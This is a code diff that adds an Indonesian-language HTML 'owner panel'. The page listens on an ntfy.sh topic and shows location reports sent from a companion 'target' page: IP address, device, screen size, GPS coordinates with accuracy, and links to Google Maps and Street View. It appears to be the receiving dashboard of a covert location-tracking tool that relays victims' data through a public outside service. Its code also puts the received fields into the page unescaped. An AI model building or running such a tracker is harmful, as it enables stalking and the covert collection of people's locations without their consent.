@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>📍 Panel Owner</title>
+  <style>
+    body{font-family:-apple-system,Arial,sans-serif;margin:0;background:#0f172a;color:#e2e8f0;padding:20px}
+    h1{font-size:20px;margin-bottom:4px}
+    .sub{color:#94a3b8;font-size:13px;margin-bottom:20px}
+    .card{background:#1e293b;border-radius:10px;padding:15px;margin-bottom:12px;border-left:4px solid #dc2626}
+    .card.sukses{border-left-color:#16a34a}
+    .card.mid{border-left-color:#eab308}
+    .row{font-size:13px;margin:4px 0;color:#cbd5e1}
+    .key{color:#94a3b8;display:inline-block;width:90px}
+    a{color:#60a5fa;text-decoration:none}
+    a:hover{text-decoration:underline}
+    .time{font-size:11px;color:#64748b;margin-bottom:6px}
+    .badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:11px;font-weight:600}
+    .badge.ok{background:#166534;color:#86efac}
+    .badge.mid{background:#854d0e;color:#fde047}
+    .badge.bad{background:#991b1b;color:#fca5a5}
+    .empty{text-align:center;color:#64748b;padding:40px}
+    .status-bar{position:fixed;top:0;left:0;right:0;padding:8px 20px;font-size:12px;background:#1e293b;border-bottom:1px solid #334155;color:#94a3b8}
+    body{padding-top:50px}
+  </style>
+</head>
+<body>
+  <div class="status-bar" id="statusBar">🔌 Menghubungkan ke ntfy.sh...</div>
+  <h1>📍 Lokasi Masuk</h1>
+  <div class="sub">Live — biarkan tab ini terbuka</div>
+  <div id="list"><div class="empty">Menunggu data...</div></div>
+
+  <script>
+    // 🔴 HARUS SAMA dengan TOPIK di target.html
+    const TOPIK = "GANTI-TOPIK-RAHASIA-KAMU";
+
+    const list = document.getElementById("list");
+    const statusBar = document.getElementById("statusBar");
+    let first = true;
+
+    const es = new EventSource("https://ntfy.sh/" + TOPIK + "/sse");
+
+    es.onopen = () => {
+      statusBar.textContent = "🟢 Terhubung — menunggu lokasi masuk...";
+      statusBar.style.color = "#86efac";
+    };
+
+    es.onerror = () => {
+      statusBar.textContent = "🔴 Koneksi terputus — coba refresh halaman";
+      statusBar.style.color = "#fca5a5";
+    };
+
+    es.onmessage = (e) => {
+      let msg;
+      try { msg = JSON.parse(e.data); } catch { return; }
+      if (msg.event !== "message") return;
+
+      let d;
+      try { d = JSON.parse(msg.message); } catch { return; }
+
+      if (first) { list.innerHTML = ""; first = false; }
+
+      const sukses = d.status === "sukses";
+      const acc = d.akurasi || 9999;
+
+      // badge akurasi
+      let badge = "";
+      if (sukses) {
+        if (acc <= 20) badge = `<span class="badge ok">Akurat (±${acc}m)</span>`;
+        else if (acc <= 100) badge = `<span class="badge mid">Sedang (±${acc}m)</span>`;
+        else badge = `<span class="badge bad">Kasar (±${acc}m)</span>`;
+      }
+
+      const card = document.createElement("div");
+      card.className = "card " + (sukses ? (acc <= 100 ? "sukses" : "mid") : "");
+
+      let html = `<div class="time">🕒 ${new Date(d.waktu).toLocaleString("id-ID")}</div>`;
+      html += `<div class="row"><span class="key">Status</span> ${d.status} ${badge}</div>`;
+      html += `<div class="row"><span class="key">IP</span> ${d.ip || "-"}</div>`;
+      html += `<div class="row"><span class="key">Device</span> ${d.device || "-"}</div>`;
+      html += `<div class="row"><span class="key">Layar</span> ${d.layar || "-"}</div>`;
+
+      if (sukses) {
+        const maps = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+        const streetView = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon}`;
+        html += `<div class="row"><span class="key">Koordinat</span> <code>${d.lat}, ${d.lon}</code></div>`;
+        html += `<div class="row"><span class="key">Akurasi</span> ±${d.akurasi} meter</div>`;
+        html += `<div class="row"><span class="key">Maps</span> <a href="${maps}" target="_blank">Google Maps →</a></div>`;
+        html += `<div class="row"><span class="key">Street View</span> <a href="${streetView}" target="_blank">Lihat sekitar →</a></div>`;
+      }
+
+      card.innerHTML = html;
+      list.prepend(card);
+    };
+  </script>
+</body>
+</html>
